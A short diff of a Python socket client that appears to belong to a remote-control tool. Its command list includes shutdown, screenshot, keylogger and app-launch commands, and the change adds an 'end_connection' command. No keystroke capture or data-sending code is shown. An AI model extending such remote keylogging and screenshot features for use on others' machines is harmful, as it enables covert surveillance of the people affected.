@@ -2,7 +2,9 @@ import socket
 import os
 import time
 
+
 # Commands
+CMD_END_CONNECTION = 'end_connection'
 CMD_SHUTDOWN = 'shutdown'
 CMD_TAKE_SCREENSHOT = 'screenshot'
 CMD_KEY_LOGGER = 'keylogger'
@@ -39,6 +41,7 @@ class Client:
     self.addr = (self.host, self.port)
     is_disconnected = True
     print("[CONNECTING] Connecting to server...")
+
     while is_disconnected:
       try:
         self.socket.connect(self.addr)
@@ -165,6 +168,9 @@ class Client:
     self.socket.send(CMD_START_APP.encode())
     time.sleep(0.01)
     self.socket.send(app_name.encode())
+
+  def end_connection(self):
+    self.socket.send(CMD_END_CONNECTION.encode())
     
 
 
